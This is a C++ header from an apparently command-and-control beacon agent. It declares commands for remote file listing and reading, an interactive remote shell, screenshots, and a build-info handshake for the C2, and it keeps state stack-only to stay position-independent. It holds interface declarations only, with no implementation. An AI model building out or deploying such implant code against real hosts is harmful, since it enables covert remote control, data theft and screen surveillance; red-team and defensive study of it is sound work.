#pragma once

#include "primitives.h"
#include "shell.h"
#include "screen_capture.h"

// Enum to represent the different command types that can be handled by the agent
enum CommandType : UINT8
{
    Command_Hello = 0,
    Command_GetDirectoryContent = 1,
    Command_GetFileContent = 2,
    Command_GetFileChunkHash = 3,
    Command_WriteShell = 4,
    Command_ReadShell = 5,
    Command_GetDisplays = 6,
    Command_GetScreenshot = 7,
    Command_CloseShell = 8,
    Command_Exit = 9,
    Command_OpenShell = 10,
    CommandTypeCount
};

// =============================================================================
// Compile-time capability flags
//
// Each FEATURE CATEGORY has a SUPPORT_<CATEGORY> macro (default 1). Override to
// 0 per-platform/build (e.g. via a toolchain compile definition) to compile a
// whole category out: every command it owns is then unregistered in the
// dispatch table (main.cc) and its bit is cleared in the Hello capability mask.
// These macros are the single source of truth for which feature categories this
// beacon supports — the dispatch wiring and BuildCapabilityMask() both derive
// from them. Hello and Exit are mandatory core commands and are always
// registered; they are not feature-gated and not advertised in the mask.
//
// Category -> owned commands:
//   FILESYSTEM  GetDirectoryContent, GetFileContent, GetFileChunkHash
//   SHELL       OpenShell, CloseShell, ReadShell, WriteShell
//   DISPLAY     GetDisplays, GetScreenshot
// =============================================================================
#ifndef SUPPORT_FILESYSTEM
#define SUPPORT_FILESYSTEM 1
#endif
#ifndef SUPPORT_SHELL
#define SUPPORT_SHELL 1
#endif
#ifndef SUPPORT_DISPLAY
#define SUPPORT_DISPLAY 1
#endif

#ifndef AGENT_BUILD_NUMBER
#define AGENT_BUILD_NUMBER 0
#endif
#ifndef AGENT_COMMIT_HASH
#define AGENT_COMMIT_HASH "00000000"
#endif
#ifndef AGENT_API_VERSION
#define AGENT_API_VERSION 5
#endif
#ifndef AGENT_NAME_ID
#define AGENT_NAME_ID 0
#endif

// Build metadata header prepended to the Hello response (right after the
// status code). ApiVersion and AgentNameId lead the packet so the C2 can
// identify the agent and determine the expected packet structure before
// parsing the variable rest of the response.
#pragma pack(push, 1)
struct AgentBuildInfo
{
    UINT32 ApiVersion;  ///< Agent API version (bumped on breaking protocol changes)
    UINT32 AgentNameId; ///< Agent implementation identifier (AGENT_NAME_ID)
    CHAR CommitHash[9]; ///< 8 hex chars + null
    UINT32 BuildNumber;
    BOOL Is64Bit; ///< true iff this agent binary is 64-bit (sizeof(void*) == 8)
};
#pragma pack(pop)

/**
 * @brief Feature categories advertised in the Hello capability mask.
 *
 * @details Each category's bit position in CapabilityMask equals its value
 *          here. Hello and Exit are mandatory core commands and are
 *          intentionally NOT represented (always available, never gated).
 */
enum CapabilityBit : UINT8
{
    Capability_FileSystem = 0, ///< File system access (dir listing, file read, chunk hash)
    Capability_Shell = 1,      ///< Interactive shell (open/close/read/write)
    Capability_Display = 2,    ///< Display enumeration + screenshot
    CapabilityBitCount
};

/**
 * @brief 64-bit feature-category capability mask appended to the Hello response.
 *
 * @details Bit i (byte i/8, bit i%8, LSB-first) is set iff feature category i
 *          is supported. Bits [CapabilityBitCount .. 63] are reserved (0).
 *          Read bit i as (Bits[i/8] >> (i%8)) & 1.
 */
static constexpr USIZE CAPABILITY_MASK_BYTES = 8; ///< CapabilityMask size in bytes (64 bits)

#pragma pack(push, 1)
struct CapabilityMask
{
    UINT8 Bits[CAPABILITY_MASK_BYTES]; ///< Raw category bitmask, LSB-first per byte
};
#pragma pack(pop)

static_assert(CapabilityBitCount <= CAPABILITY_MASK_BYTES * 8, "CapabilityMask too small for categories");
static_assert(sizeof(CapabilityMask) == 8, "CapabilityMask must stay 8 bytes on the wire");

/**
 * @brief Builds the capability mask at compile time from the SUPPORT_* macros.
 *
 * @details Each category bit mirrors its SUPPORT_<CATEGORY> macro; the bit
 *          position equals the CapabilityBit value.
 *
 * @return Compile-time-constant CapabilityMask to append to the Hello response.
 */
inline constexpr CapabilityMask BuildCapabilityMask() noexcept
{
    CapabilityMask mask = {};
    auto set = [&mask](CapabilityBit bit, int supported)
    {
        if (supported)
        {
            USIZE b = static_cast<USIZE>(bit);
            mask.Bits[b / 8] |= static_cast<UINT8>(1u << (b % 8));
        }
    };
    set(Capability_FileSystem, SUPPORT_FILESYSTEM);
    set(Capability_Shell, SUPPORT_SHELL);
    set(Capability_Display, SUPPORT_DISPLAY);
    return mask;
}

// Status codes for command handling results
enum StatusCode : UINT32
{
    StatusSuccess = 0,
    StatusError = 1,
    StatusUnknownCommand = 2
};

// Context structure to hold state information for command handlers, such as shell and screen capture context instances
struct Context
{
    ShellManager shellManager;
    ScreenCaptureContext *screenCaptureContext = nullptr;
    // Set by Handle_ExitCommand; read by the main loop so it can send the ACK
    // and then tear down. Lives on the stack (no data section) to stay PIC-safe.
    BOOL shouldExit = false;

    ~Context()
    {
        // shellManager destroys its own shells.
        if (this->screenCaptureContext != nullptr)
        {
            delete this->screenCaptureContext;
            this->screenCaptureContext = nullptr; // Good practice to avoid double-free
        }
    }
};

// Type definition for command handler function pointers
using CommandHandler = VOID (*)(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);

// Command handler function declarations
VOID Handle_HelloCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);
VOID Handle_GetDirectoryContentCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);
VOID Handle_GetFileContentCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);
VOID Handle_GetFileChunkHashCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);
VOID Handle_ReadShellCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);
VOID Handle_WriteShellCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);
VOID Handle_OpenShellCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);
VOID Handle_CloseShellCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);
VOID Handle_GetDisplaysCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);
VOID Handle_GetScreenshotCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);
VOID Handle_ExitCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);